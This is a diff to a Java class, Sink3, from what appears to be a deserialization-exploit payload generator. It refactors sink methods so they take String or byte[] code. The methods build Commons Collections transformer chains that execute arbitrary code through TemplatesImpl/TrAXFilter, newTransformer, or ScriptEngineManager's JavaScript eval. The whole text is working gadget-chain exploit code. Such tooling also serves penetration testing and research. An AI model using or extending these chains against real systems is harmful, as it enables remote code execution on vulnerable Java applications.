@@ -28,8 +28,16 @@ public class Sink3 {
         return new SinkResult(SinkResultID.RuntimeExec, transformer, null, null);
     }
 
-    public static SinkResult TemplatesImplTrAXFilterSink(String code) throws Exception {
-        TemplatesImpl templates = Utils.generateTemplates(code);
+    public static SinkResult TemplatesImplTrAXFilterSink(Object code) throws Exception {
+        TemplatesImpl templates;
+        if (code instanceof String) {
+            templates = Utils.generateTemplates((String) code);
+        } else if (code instanceof byte[]) {
+            templates = Utils.generateTemplates((byte[]) code);
+        } else {
+            throw new IllegalArgumentException("[code]: Can't use " + code.getClass() + " as code");
+        }
+
 
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(TrAXFilter.class),
@@ -40,27 +48,40 @@ public class Sink3 {
         return new SinkResult(SinkResultID.TemplatesImplTrAXFilter, transformer, null, templates);
     }
 
-    public static SinkResult TemplatesImplNewTransformerSink(String code) throws Exception {
-        TemplatesImpl templates = Utils.generateTemplates(code);
+    public static SinkResult TemplatesImplNewTransformerSink(Object code) throws Exception {
+        TemplatesImpl templates;
+        if (code instanceof String) {
+            templates = Utils.generateTemplates((String) code);
+        } else if (code instanceof byte[]) {
+            templates = Utils.generateTemplates((byte[]) code);
+        } else {
+            throw new IllegalArgumentException("[code]: Can't use " + code.getClass() + " as code");
+        }
 
         Transformer transformer = new InvokerTransformer("newTransformer", null, null);
 
         return new SinkResult(SinkResultID.TemplatesImplNewTransformer, transformer, null, templates);
     }
 
-    public static SinkResult ScriptEngineManagerSink(String code) throws Exception {
+    public static SinkResult ScriptEngineManagerSink(Object code) throws Exception {
+        String realCode;
+        if (code instanceof String) {
+            realCode = (String) code;
+        } else {
+            throw new IllegalArgumentException("[code]: Can't use " + code.getClass() + " as code");
+        }
+
         Transformer[] transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class),
                 new InvokerTransformer("newInstance", new Class[0], new Object[0]),
                 new InvokerTransformer("getEngineByName", new Class[]{String.class},
                         new Object[]{"JavaScript"}), new InvokerTransformer("eval",
-                new Class[]{String.class}, new String[]{code}),
+                new Class[]{String.class}, new String[]{realCode}),
                 new ConstantTransformer(1)};
 
         Transformer transformer = new ChainedTransformer(transformers);
 
         return new SinkResult(SinkResultID.ScriptEngineManager, transformer, null, null);
     }
-
 
 
 }
